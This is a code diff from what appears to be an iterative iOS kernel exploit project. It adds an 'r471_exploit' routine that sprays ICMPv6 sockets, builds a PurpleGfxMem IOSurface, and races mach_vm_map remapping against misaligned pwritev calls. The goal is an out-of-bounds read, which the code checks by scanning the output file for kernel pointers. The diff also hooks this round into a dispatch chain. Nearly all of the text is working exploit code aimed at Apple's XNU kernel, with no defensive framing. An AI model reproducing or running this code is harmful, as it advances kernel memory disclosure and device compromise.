@@ -17680,6 +17680,411 @@ static void r470_exploit(void) {
     #undef R470_IOV_LEN
 }
 
+/*
+ * r471: 8-page IOSurface + direct IOSurface MachPort + large IOV
+ *
+ * Key fix: Previous r470 used 2-page (32KB) IOSurface — below
+ * MIN_DIRECT_WRITE_SIZE (4 * PAGE_SIZE = 64KB on arm64).
+ * Even though IO_CONTIG check is before min_length check in
+ * cluster_io_type, the vm_object from mach_make_memory_entry_64
+ * may not preserve phys_contiguous flag.
+ *
+ * This round:
+ * - 8-page (128KB) IOSurface with PurpleGfxMem
+ * - Uses IOSurfaceCreateMachPort for memory entry
+ * - Full-surface IOV (128KB) to exceed MIN_DIRECT_WRITE_SIZE
+ * - Misaligned IOV variant: surf+0x3F00, len=0x10100 (65792 bytes > 64KB)
+ * - Tests both aligned and misaligned paths
+ * - Detects IO_CONTIG via EINVAL or timing differences
+ */
+
+struct r471_shared {
+    volatile int go;
+    volatile int stop;
+    volatile int remap_count;
+    mach_vm_address_t target;
+    mach_vm_size_t target_size;
+    mach_port_t surf_entry;
+    volatile mach_port_t search_entry;
+};
+
+static void *r471_osc_thread(void *arg) {
+    struct r471_shared *s = (struct r471_shared *)arg;
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+    mach_port_t self = mach_task_self();
+    mach_vm_address_t tgt = s->target;
+    mach_vm_size_t sz = s->target_size;
+    mach_port_t se = s->surf_entry;
+    while (!s->go) __asm__ volatile("yield");
+    while (!s->stop) {
+        mach_port_t ce = s->search_entry;
+        if (ce == MACH_PORT_NULL) { __asm__ volatile("yield"); continue; }
+        mach_vm_address_t t = tgt;
+        mach_vm_map(self, &t, sz, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+            se, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
+            VM_INHERIT_NONE);
+        t = tgt;
+        kern_return_t kr = mach_vm_map(self, &t, sz, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+            ce, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
+            VM_INHERIT_NONE);
+        if (kr == KERN_SUCCESS) __sync_fetch_and_add(&s->remap_count, 1);
+    }
+    return NULL;
+}
+
+static void r471_exploit(void) {
+    rlog("\n=== r471: 8-page IOSurface + large IOV TOCTOU ===\n\n");
+    fflush(stdout);
+
+    #define R471_PAGE_SZ 16384
+    #define R471_SURF_PAGES 8
+    #define R471_SURF_SZ (R471_SURF_PAGES * R471_PAGE_SZ)
+    #define R471_SEARCH_SZ (32ULL * 1024 * 1024)
+    #define R471_ITERS_PER_PAGE 50
+
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+
+    /* Phase 0: F_NOCACHE output file */
+    rlog("  --- Phase 0: Output file (F_NOCACHE) ---\n"); fflush(stdout);
+    char tmppath[256];
+    snprintf(tmppath, sizeof(tmppath), "/var/mobile/tmp_r471_%d", getpid());
+    int fd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0644);
+    fcntl(fd, F_NOCACHE, 1);
+    char *zbuf = (char *)calloc(1, R471_SURF_SZ);
+    pwrite(fd, zbuf, R471_SURF_SZ, 0);
+    free(zbuf);
+    rlog("    fd=%d\n", fd);
+
+    /* Phase 1: ICMPv6 spray */
+    rlog("  --- Phase 1: ICMPv6 spray ---\n"); fflush(stdout);
+    int icmp_fds[500];
+    int icmp_count = 0;
+    for (int i = 0; i < 250; i++) {
+        icmp_fds[i] = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
+        if (icmp_fds[i] < 0) continue;
+        struct icmp6_filter filt;
+        ICMP6_FILTER_SETBLOCKALL(&filt);
+        ICMP6_FILTER_SETPASS(i & 0xFF, &filt);
+        setsockopt(icmp_fds[i], IPPROTO_ICMPV6, ICMP6_FILTER, &filt, sizeof(filt));
+        icmp_count++;
+    }
+    rlog("    %d sockets\n", icmp_count);
+
+    /* Phase 2: 8-page PurpleGfxMem IOSurface (128KB) */
+    rlog("\n  --- Phase 2: PurpleGfxMem IOSurface (8 pages = %dKB) ---\n",
+         R471_SURF_SZ / 1024);
+    fflush(stdout);
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int pw = R471_SURF_SZ, ph = 1, pbpe = 1, ppf = 0x4C303038;
+    CFNumberRef pwn = CFNumberCreate(NULL, kCFNumberIntType, &pw);
+    CFNumberRef phn = CFNumberCreate(NULL, kCFNumberIntType, &ph);
+    CFNumberRef pbn = CFNumberCreate(NULL, kCFNumberIntType, &pbpe);
+    CFNumberRef ppn = CFNumberCreate(NULL, kCFNumberIntType, &ppf);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), pwn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), phn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), pbn);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), ppn);
+    int alloc_sz_v = R471_SURF_SZ;
+    CFNumberRef an = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz_v);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), an);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceMemoryRegion"),
+                         CFSTR("PurpleGfxMem"));
+    IOSurfaceRef surf = IOSurfaceCreate(props);
+    CFRelease(props); CFRelease(pwn); CFRelease(phn); CFRelease(pbn); CFRelease(ppn); CFRelease(an);
+    if (!surf) {
+        rlog("    IOSurface create FAILED\n");
+        for (int i = 0; i < icmp_count; i++) close(icmp_fds[i]);
+        close(fd); unlink(tmppath); rlog("\n=== r471 done ===\n"); return;
+    }
+    IOSurfaceLock(surf, 0, NULL);
+    void *surf_base = IOSurfaceGetBaseAddress(surf);
+    memset(surf_base, 0xAA, R471_SURF_SZ);
+    rlog("    base=%p alloc=%zu\n", surf_base, IOSurfaceGetAllocSize(surf));
+
+    /* Try TWO memory entry methods */
+    /* Method 1: mach_make_memory_entry_64 */
+    memory_object_size_t surf_memsz1 = R471_SURF_SZ;
+    mach_port_t entry_mme = MACH_PORT_NULL;
+    kern_return_t kr1 = mach_make_memory_entry_64(mach_task_self(), &surf_memsz1,
+        (mach_vm_address_t)(uintptr_t)surf_base,
+        VM_PROT_READ | VM_PROT_WRITE, &entry_mme, MACH_PORT_NULL);
+    rlog("    mach_make_memory_entry: kr=0x%x sz=%llu entry=0x%x\n",
+         kr1, (unsigned long long)surf_memsz1, entry_mme);
+
+    /* Method 2: IOSurfaceCreateMachPort */
+    mach_port_t entry_iosp = IOSurfaceCreateMachPort(surf);
+    rlog("    IOSurfaceCreateMachPort: entry=0x%x\n", entry_iosp);
+
+    IOSurfaceUnlock(surf, 0, NULL);
+
+    /* Phase 3: Diagnostic — test both entries + multiple IOV sizes */
+    rlog("\n  --- Phase 3: Diagnostic ---\n"); fflush(stdout);
+    {
+        /* Test A: Full surface write (128KB, aligned) with mach_make_memory_entry */
+        struct iovec dvA = { surf_base, R471_SURF_SZ };
+        errno = 0;
+        ssize_t dwA = pwritev(fd, &dvA, 1, 0);
+        rlog("    A: full 128K pwritev: w=%zd errno=%d\n", dwA, errno);
+
+        /* Test B: 64KB write (4 pages, aligned) */
+        struct iovec dvB = { surf_base, 4 * R471_PAGE_SZ };
+        errno = 0;
+        ssize_t dwB = pwritev(fd, &dvB, 1, 0);
+        rlog("    B: 64K pwritev: w=%zd errno=%d\n", dwB, errno);
+
+        /* Test C: Misaligned, > 64KB: surf+0x3F00, len=0x10100 */
+        struct iovec dvC = {
+            (void *)((uintptr_t)surf_base + 0x3F00), 0x10100
+        };
+        errno = 0;
+        ssize_t dwC = pwritev(fd, &dvC, 1, 0x3F00);
+        rlog("    C: misaligned 0x3F00+0x10100 pwritev: w=%zd errno=%d\n", dwC, errno);
+
+        /* Test D: 4KB misaligned (old r470 params, should NOT trigger IO_CONTIG) */
+        struct iovec dvD = {
+            (void *)((uintptr_t)surf_base + 0x3F00), 0x1000
+        };
+        errno = 0;
+        ssize_t dwD = pwritev(fd, &dvD, 1, 0x3F00);
+        rlog("    D: misaligned 0x3F00+0x1000 pwritev: w=%zd errno=%d\n", dwD, errno);
+
+        /* Test E: Try remapped anonymous pages with 128K write */
+        mach_vm_address_t anon = 0;
+        mach_vm_allocate(mach_task_self(), &anon, R471_SURF_SZ, VM_FLAGS_ANYWHERE);
+        memset((void *)(uintptr_t)anon, 0xBB, R471_SURF_SZ);
+        /* Remap surf_base to anon pages, then write */
+        memory_object_size_t anon_msz = R471_SURF_SZ;
+        mach_port_t anon_entry = MACH_PORT_NULL;
+        mach_make_memory_entry_64(mach_task_self(), &anon_msz, anon,
+            VM_PROT_READ | VM_PROT_WRITE, &anon_entry, MACH_PORT_NULL);
+        mach_vm_address_t remap_tgt = (mach_vm_address_t)(uintptr_t)surf_base;
+        kern_return_t rkr = mach_vm_map(mach_task_self(), &remap_tgt, R471_SURF_SZ, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+            anon_entry, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
+            VM_INHERIT_NONE);
+        struct iovec dvE = { surf_base, R471_SURF_SZ };
+        errno = 0;
+        ssize_t dwE = pwritev(fd, &dvE, 1, 0);
+        rlog("    E: anon remapped 128K: w=%zd errno=%d (remap kr=0x%x)\n", dwE, errno, rkr);
+        uint8_t chkE;
+        pread(fd, &chkE, 1, 0);
+        rlog("    E: file[0]=%02x (expect 0xBB)\n", chkE);
+        /* Restore IOSurface mapping */
+        remap_tgt = (mach_vm_address_t)(uintptr_t)surf_base;
+        mach_vm_map(mach_task_self(), &remap_tgt, R471_SURF_SZ, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+            entry_mme, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
+            VM_INHERIT_NONE);
+        mach_port_deallocate(mach_task_self(), anon_entry);
+        mach_vm_deallocate(mach_task_self(), anon, R471_SURF_SZ);
+        memset(surf_base, 0xAA, R471_SURF_SZ);
+
+        /* Quick 500-iter race with 128KB write */
+        rlog("    Quick race: 500 x 128K pwritev + 2 osc threads...\n"); fflush(stdout);
+        struct r471_shared qctx;
+        memset(&qctx, 0, sizeof(qctx));
+        qctx.target = (mach_vm_address_t)(uintptr_t)surf_base;
+        qctx.target_size = R471_SURF_SZ;
+        qctx.surf_entry = entry_mme;
+        mach_vm_address_t qremap = 0;
+        mach_vm_allocate(mach_task_self(), &qremap, R471_SURF_SZ, VM_FLAGS_ANYWHERE);
+        memset((void *)(uintptr_t)qremap, 0xBB, R471_SURF_SZ);
+        memory_object_size_t qmsz = R471_SURF_SZ;
+        mach_port_t qentry = MACH_PORT_NULL;
+        mach_make_memory_entry_64(mach_task_self(), &qmsz, qremap,
+            VM_PROT_READ | VM_PROT_WRITE, &qentry, MACH_PORT_NULL);
+        qctx.search_entry = qentry;
+        pthread_t qt1, qt2;
+        pthread_create(&qt1, NULL, r471_osc_thread, &qctx);
+        pthread_create(&qt2, NULL, r471_osc_thread, &qctx);
+        qctx.go = 1; __sync_synchronize();
+        int qsurf = 0, qremap_v = 0, qeinval = 0, qother = 0;
+        for (int qi = 0; qi < 500; qi++) {
+            /* Prep file with 0xFF */
+            uint8_t ffbuf[256];
+            memset(ffbuf, 0xFF, sizeof(ffbuf));
+            pwrite(fd, ffbuf, sizeof(ffbuf), 0);
+            /* Full 128K write */
+            struct iovec qiov = { surf_base, R471_SURF_SZ };
+            errno = 0;
+            ssize_t qw = pwritev(fd, &qiov, 1, 0);
+            if (qw == -1 && errno == EINVAL) qeinval++;
+            else if (qw > 0) {
+                uint8_t qchk;
+                pread(fd, &qchk, 1, 0);
+                if (qchk == 0xAA) qsurf++;
+                else if (qchk == 0xBB) qremap_v++;
+                else qother++;
+            } else qother++;
+        }
+        qctx.stop = 1; __sync_synchronize();
+        pthread_join(qt1, NULL); pthread_join(qt2, NULL);
+        rlog("    Quick 128K: surf=%d remap=%d einval=%d other=%d osc=%d\n",
+             qsurf, qremap_v, qeinval, qother, qctx.remap_count);
+        mach_port_deallocate(mach_task_self(), qentry);
+        mach_vm_deallocate(mach_task_self(), qremap, R471_SURF_SZ);
+        memset(surf_base, 0xAA, R471_SURF_SZ);
+
+        /* Prep file for race */
+        uint8_t *ffbuf2 = calloc(1, R471_SURF_SZ);
+        memset(ffbuf2, 0xFF, R471_SURF_SZ);
+        pwrite(fd, ffbuf2, R471_SURF_SZ, 0);
+        free(ffbuf2);
+    }
+
+    /* Phase 4: Search mapping (32 MiB) */
+    rlog("\n  --- Phase 4: Search mapping (32 MiB) ---\n"); fflush(stdout);
+    uint64_t search_pages = R471_SEARCH_SZ / R471_PAGE_SZ;
+    mach_vm_address_t search_base = 0;
+    kern_return_t kr = mach_vm_allocate(mach_task_self(), &search_base, R471_SEARCH_SZ,
+        VM_FLAGS_ANYWHERE);
+    if (kr != KERN_SUCCESS) {
+        rlog("    alloc FAILED kr=0x%x\n", kr);
+        mach_port_deallocate(mach_task_self(), entry_mme);
+        if (entry_iosp) mach_port_deallocate(mach_task_self(), entry_iosp);
+        for (int i = 0; i < icmp_count; i++) close(icmp_fds[i]);
+        close(fd); unlink(tmppath); CFRelease(surf);
+        rlog("\n=== r471 done ===\n"); return;
+    }
+    rlog("    base=0x%llx\n", (unsigned long long)search_base);
+    rlog("    Faulting %llu pages...\n", (unsigned long long)search_pages);
+    for (uint64_t p = 0; p < search_pages; p++) {
+        uint8_t *pg = (uint8_t *)(uintptr_t)(search_base + p * R471_PAGE_SZ);
+        pg[0] = 0xDE;
+        pg[1] = (uint8_t)(p & 0xFF);
+        pg[2] = (uint8_t)((p >> 8) & 0xFF);
+    }
+    rlog("    Done faulting\n");
+
+    /* Phase 5: TOCTOU race with MISALIGNED 65792-byte write */
+    rlog("\n  --- Phase 5: TOCTOU race (misaligned 0x3F00+0x10100) ---\n");
+    rlog("    %d iters per search page, %llu search pages\n",
+         R471_ITERS_PER_PAGE, (unsigned long long)search_pages);
+    fflush(stdout);
+
+    #define R471_OSC_THREADS 4
+    #define R471_MIS_OFF 0x3F00
+    #define R471_MIS_LEN 0x10100
+
+    struct r471_shared shared;
+    memset(&shared, 0, sizeof(shared));
+    shared.target = (mach_vm_address_t)(uintptr_t)surf_base;
+    shared.target_size = R471_SURF_SZ;
+    shared.surf_entry = entry_mme;
+    shared.search_entry = MACH_PORT_NULL;
+
+    pthread_t osc_tids[R471_OSC_THREADS];
+    for (int t = 0; t < R471_OSC_THREADS; t++)
+        pthread_create(&osc_tids[t], NULL, r471_osc_thread, &shared);
+    shared.go = 1;
+    __sync_synchronize();
+
+    int total_races = 0, race_wins = 0, oob_reads = 0;
+    uint8_t oob_buf[R471_PAGE_SZ * 2];
+    int found_kptr = 0;
+    mach_port_t prev_entry = MACH_PORT_NULL;
+
+    for (uint64_t sp = 0; sp < search_pages - R471_SURF_PAGES && !found_kptr; sp++) {
+        mach_vm_address_t sp_addr = search_base + sp * R471_PAGE_SZ;
+
+        memory_object_size_t sp_memsz = R471_SURF_SZ;
+        mach_port_t sp_entry = MACH_PORT_NULL;
+        kern_return_t ekr = mach_make_memory_entry_64(mach_task_self(), &sp_memsz,
+            sp_addr, VM_PROT_READ | VM_PROT_WRITE, &sp_entry, MACH_PORT_NULL);
+        if (ekr != KERN_SUCCESS || sp_memsz != R471_SURF_SZ) continue;
+
+        shared.search_entry = sp_entry;
+        __sync_synchronize();
+        if (prev_entry != MACH_PORT_NULL)
+            mach_port_deallocate(mach_task_self(), prev_entry);
+        prev_entry = sp_entry;
+
+        for (int iter = 0; iter < R471_ITERS_PER_PAGE; iter++) {
+            struct iovec wv = {
+                (void *)((uintptr_t)surf_base + R471_MIS_OFF),
+                R471_MIS_LEN
+            };
+            errno = 0;
+            ssize_t w = pwritev(fd, &wv, 1, R471_MIS_OFF);
+            int save_errno = errno;
+            total_races++;
+
+            if (w == -1 && save_errno == EINVAL) {
+                race_wins++;
+                pread(fd, oob_buf, sizeof(oob_buf), R471_MIS_OFF);
+                int kptrs = 0;
+                for (int j = 0x100; j < (int)sizeof(oob_buf) - 7; j += 8) {
+                    uint64_t val = *(uint64_t *)(oob_buf + j);
+                    if ((val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        kptrs++;
+                        if (kptrs <= 5)
+                            rlog("    [sp=%llu iter=%d] KPTR +0x%x: 0x%016llx\n",
+                                 (unsigned long long)sp, iter, j,
+                                 (unsigned long long)val);
+                    }
+                }
+                if (kptrs > 0) {
+                    rlog("    *** OOB with %d kernel ptrs at search page %llu ***\n",
+                         kptrs, (unsigned long long)sp);
+                    oob_reads++;
+                    found_kptr = 1;
+                    break;
+                }
+                if (race_wins <= 10 || race_wins % 50 == 0)
+                    rlog("    Race win #%d at sp=%llu (no kptrs)\n",
+                         race_wins, (unsigned long long)sp);
+            } else if (w == -1 && total_races <= 5) {
+                rlog("    pwritev FAIL=%zd errno=%d at sp=%llu\n",
+                     w, save_errno, (unsigned long long)sp);
+            }
+        }
+
+        if ((sp + 1) % 500 == 0)
+            rlog("    ... sp=%llu/%llu  races=%d wins=%d oob=%d\n",
+                 (unsigned long long)(sp + 1), (unsigned long long)search_pages,
+                 total_races, race_wins, oob_reads);
+    }
+
+    shared.stop = 1;
+    __sync_synchronize();
+    int total_osc = 0;
+    for (int t = 0; t < R471_OSC_THREADS; t++)
+        pthread_join(osc_tids[t], NULL);
+    total_osc = shared.remap_count;
+    if (prev_entry != MACH_PORT_NULL)
+        mach_port_deallocate(mach_task_self(), prev_entry);
+
+    rlog("\n    TOTAL: races=%d wins=%d oob_kptr=%d osc=%d\n",
+         total_races, race_wins, oob_reads, total_osc);
+
+    #undef R471_OSC_THREADS
+    #undef R471_MIS_OFF
+    #undef R471_MIS_LEN
+
+    /* Cleanup */
+    mach_vm_deallocate(mach_task_self(), search_base, R471_SEARCH_SZ);
+    mach_port_deallocate(mach_task_self(), entry_mme);
+    if (entry_iosp) mach_port_deallocate(mach_task_self(), entry_iosp);
+    for (int i = 0; i < icmp_count; i++) close(icmp_fds[i]);
+    close(fd); unlink(tmppath);
+    CFRelease(surf);
+
+    rlog("\n=== r471 done ===\n");
+
+    #undef R471_PAGE_SZ
+    #undef R471_SURF_PAGES
+    #undef R471_SURF_SZ
+    #undef R471_SEARCH_SZ
+    #undef R471_ITERS_PER_PAGE
+}
+
 /* r469: TOCTOU via pipe write — copyin from IOSurface while remapping
  *
  * Theory: pipe write goes through copyin() which may use bcopy_phys
@@ -87324,6 +87729,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 474) {
+            rlog("*** rounds=474: 8-page IOSurface + large IOV TOCTOU ***\n\n");
+            fflush(stdout);
+            r471_exploit();
+            goto done;
+        }
         if (rounds == 473) {
             rlog("*** rounds=473: ClearSword-style TOCTOU ***\n\n");
             fflush(stdout);
@@ -90183,7 +90594,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
